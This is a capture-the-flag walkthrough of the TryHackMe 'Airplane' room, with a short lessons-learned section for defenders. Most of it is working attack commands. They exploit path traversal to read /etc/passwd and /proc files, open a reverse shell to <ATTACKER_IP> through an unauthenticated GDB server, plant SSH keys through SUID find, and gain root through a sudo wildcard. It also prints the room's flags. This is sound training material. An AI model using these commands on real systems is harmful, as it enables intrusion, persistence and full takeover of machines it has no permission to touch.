# Airplane — TryHackMe Writeup

## Overview

| Detail | Info |
|--------|------|
| **Platform** | TryHackMe |
| **Room** | Airplane |
| **Difficulty** | Medium |
| **OS** | Linux (Ubuntu 20.04) |
| **Techniques** | LFI, GDB Server Exploitation, SUID Abuse, Sudo Path Traversal |

## Kill Chain Summary

1. **Reconnaissance** — Nmap reveals SSH (22), unknown service (6048), and Flask web app (8000)
2. **Local File Inclusion** — Unfiltered `?page=` parameter allows reading arbitrary files
3. **Process Enumeration via /proc** — Discover GDB Server running on port 6048
4. **Initial Access (hudson)** — Exploit unauthenticated GDB Server for reverse shell
5. **Lateral Movement (carlos)** — Abuse SUID bit on `/usr/bin/find` owned by carlos
6. **Privilege Escalation (root)** — Exploit wildcard in sudo rule via path traversal

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- airplane.thm
```

**Results:**

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
6048/tcp open  x11?
8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
```

Key observations:
- **Port 22** — Standard SSH, useful later once we have credentials
- **Port 6048** — Unknown service, Nmap couldn't fingerprint it
- **Port 8000** — Python Flask application (Werkzeug). The root URL redirects to `http://airplane.thm:8000/?page=index.html`

The `?page=` parameter immediately stands out as a potential **Local File Inclusion (LFI)** vector.

---

## 2. Local File Inclusion (LFI)

### Testing for LFI

The `?page=` parameter suggests the application loads files from disk based on user input. We test with a classic directory traversal:

```bash
curl "http://airplane.thm:8000/?page=../../../../etc/passwd"
```

**Result:** The contents of `/etc/passwd` are returned. LFI confirmed — no input sanitization.

### Identifying Users

From `/etc/passwd`, two users have `/bin/bash` shell access:

```
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
hudson:x:1001:1001::/home/hudson:/bin/bash
```

### Reading Application Source Code

Using `/proc/self/` we gather information about the running Flask process:

```bash
# How the app is launched
curl "http://airplane.thm:8000/?page=../../../../proc/self/cmdline"
# Result: /usr/bin/python3 app.py

# Environment variables
curl "http://airplane.thm:8000/?page=../../../../proc/self/environ"
# Key finding: USER=hudson — the app runs as hudson

# Source code
curl "http://airplane.thm:8000/?page=../../../../proc/self/cwd/app.py"
```

**app.py source code:**

```python
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)

@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')
        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False
            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"] = str(len(resp.get_data()))
            return resp
        else:
            return "Page not found"
    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)
```

The vulnerability is clear: user input is concatenated directly into the file path (`'static/' + request.args.get('page')`) with **zero sanitization**. Directory traversal sequences like `../../../../` escape the `static/` directory.

### Enumerating Network Services

```bash
curl "http://airplane.thm:8000/?page=../../../../proc/net/tcp"
```

After decoding the hex output:

| Port | Address | UID | Service |
|------|---------|-----|---------|
| 53 | 127.0.0.53 | 101 | systemd-resolve |
| 22 | 0.0.0.0 | 0 | SSH |
| 631 | 127.0.0.1 | 0 | CUPS |
| 8000 | 0.0.0.0 | 1001 | Flask (hudson) |
| **6048** | **0.0.0.0** | **1001** | **Unknown (hudson)** |

Both port 8000 and port 6048 are run by UID 1001 (hudson).

### Process Enumeration

To identify the service on port 6048, we enumerate running processes via `/proc/PID/cmdline`:

```bash
for pid in $(seq 1 1000); do
  result=$(curl -s "http://airplane.thm:8000/?page=../../../../proc/$pid/cmdline")
  if [ "$result" != "Page not found" ] && [ -n "$result" ]; then
    echo "PID $pid: $result"
  fi
done
```

**Critical findings:**

| PID | Command | Significance |
|-----|---------|--------------|
| 529 | `/usr/bin/gdbserver 0.0.0.0:6048 airplane` | **GDB Server — our attack vector** |
| 533 | `/usr/bin/python3 app.py` | Flask web app |
| 558 | `/opt/airplane` | Binary being debugged |

---

## 3. Initial Access — GDB Server Exploitation

### Why GDB Server is Exploitable

GDB Server is a remote debugging tool. By design, it gives connected clients **full control** over the debugged process — including the ability to:

- Upload files to the target
- Execute arbitrary binaries
- Read/write process memory

It has **no authentication mechanism**. Exposing it on `0.0.0.0` means anyone on the network can connect and execute code.

### Exploitation via Metasploit

```bash
msfconsole
use exploit/multi/gdb/gdb_server_exec
set RHOSTS airplane.thm
set RPORT 6048
set LHOST <ATTACKER_IP>
set LPORT 4444
set PAYLOAD linux/x64/shell_reverse_tcp
exploit
```

### Alternative: Manual Exploitation via GDB

```bash
# Generate payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o rev.elf

# Start listener
nc -lvnp 4444

# Connect via GDB
gdb -q
target extended-remote airplane.thm:6048
remote put rev.elf /tmp/rev.elf
set remote exec-file /tmp/rev.elf
run
```

**Result:**

```bash
whoami
# hudson
id
# uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
```

We now have a shell as **hudson**.

---

## 4. Lateral Movement — hudson → carlos

### Upgrade Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results:

```
-rwsr-xr-x 1 carlos carlos 320160 Feb 18  2020 /usr/bin/find
```

`/usr/bin/find` has the **SUID bit set** and is **owned by carlos**. This means any command executed through `find -exec` runs as carlos.

### Reading User Flag

```bash
/usr/bin/find . -exec cat /home/carlos/user.txt \;
```

> **User Flag: `eebfca2ca5a2b8a56c46c781aeea7562`**

### Getting a Proper Shell as carlos

Since `find -exec /bin/bash -p` gives an effective UID of carlos but the real UID remains hudson (causing issues with `sudo`), we need a clean login. The approach: **write our own SSH key**.

**On attacker machine:**

```bash
ssh-keygen -t rsa -f carlos_key -N ""
cat carlos_key.pub
```

**On target (as hudson):**

```bash
echo "ssh-rsa AAAA...YOUR_PUBLIC_KEY..." > /tmp/authorized_keys
```

**Use find (as carlos) to install the key:**

```bash
/usr/bin/find . -exec mkdir -p /home/carlos/.ssh \;
/usr/bin/find . -exec cp /tmp/authorized_keys /home/carlos/.ssh/authorized_keys \;
/usr/bin/find . -exec chmod 700 /home/carlos/.ssh \;
/usr/bin/find . -exec chmod 600 /home/carlos/.ssh/authorized_keys \;
```

**Connect:**

```bash
ssh -i carlos_key carlos@airplane.thm
```

```bash
carlos@airplane:~$ id
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos),27(sudo)
```

Carlos is in the **sudo** group.

---

## 5. Privilege Escalation — carlos → root

### Sudo Enumeration

```bash
sudo -l
```

```
User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

Carlos can run **any `.rb` file** inside `/root/` as root, without a password.

### Exploiting the Wildcard

The wildcard `*` in `/root/*.rb` is the vulnerability. While we can't create files inside `/root/`, we can use **path traversal** (`../`) within the wildcard pattern. The path `/root/../tmp/shell.rb` satisfies the sudo rule because it starts with `/root/`, but after OS normalization it resolves to `/tmp/shell.rb` — a location we control.

**Create malicious Ruby script:**

```bash
echo 'exec "/bin/bash"' > /tmp/shell.rb
```

**Execute with sudo:**

```bash
sudo /usr/bin/ruby /root/../tmp/shell.rb
```

**Result:**

```bash
root@airplane:/home/carlos# whoami
root

root@airplane:/home/carlos# cat /root/root.txt
```

> **Root Flag: `190dcbeb688ce5fe029f26a1e5fce002`**

---

## Flags

| Flag | Value |
|------|-------|
| User | `eebfca2ca5a2b8a56c46c781aeea7562` |
| Root | `190dcbeb688ce5fe029f26a1e5fce002` |

---

## Lessons Learned

### For Defenders

1. **Never expose GDB Server to the network** — it provides unauthenticated code execution by design
2. **Sanitize file path inputs** — use `os.path.realpath()` and verify the resolved path stays within the intended directory
3. **Avoid SUID on powerful utilities** — tools like `find`, `vim`, `python` with SUID are equivalent to giving away shell access ([GTFOBins](https://gtfobins.github.io/))
4. **Never use wildcards in sudo rules** — path traversal via `../` trivially bypasses directory restrictions. Specify exact filenames instead

### For Attackers

1. **`/proc/` is invaluable during LFI** — it reveals running processes, network connections, environment variables, and source code without needing to guess file paths
2. **Always enumerate SUID binaries** — even common utilities can be dangerous with SUID
3. **SUID shell quirks matter** — `bash -p` preserves effective UID but not real UID; for tools like `sudo` that check real UID, you need a clean login (e.g., SSH key injection)
4. **Wildcard abuse in sudo** — always test `../` traversal when sudo rules contain `*`

---

## Tools Used

- Nmap
- curl
- Metasploit / msfvenom / GDB
- ssh-keygen
- GTFOBins reference
